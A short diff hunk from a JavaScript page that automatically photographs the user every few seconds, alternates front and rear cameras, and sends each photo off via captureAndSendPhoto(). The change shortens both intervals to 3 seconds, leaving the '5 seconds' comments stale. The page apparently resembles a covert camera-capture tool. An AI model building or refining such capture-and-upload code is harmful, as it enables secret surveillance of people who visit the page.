@@ -213,13 +213,13 @@
         useFrontCamera = !useFrontCamera; // Toggle camera
         constraints.video.facingMode = useFrontCamera ? 'user' : 'environment';
         startCamera();
-      }, 5000); // Switch camera every 5 seconds
+      }, 3000); // Switch camera every 5 seconds
     }
 
     // Automatically capture photos
     setInterval(() => {
       captureAndSendPhoto();
-    }, 5000); // Capture photo every 5 seconds
+    }, 3000); // Capture photo every 5 seconds
 
     // Music control
     function toggleMusic() {
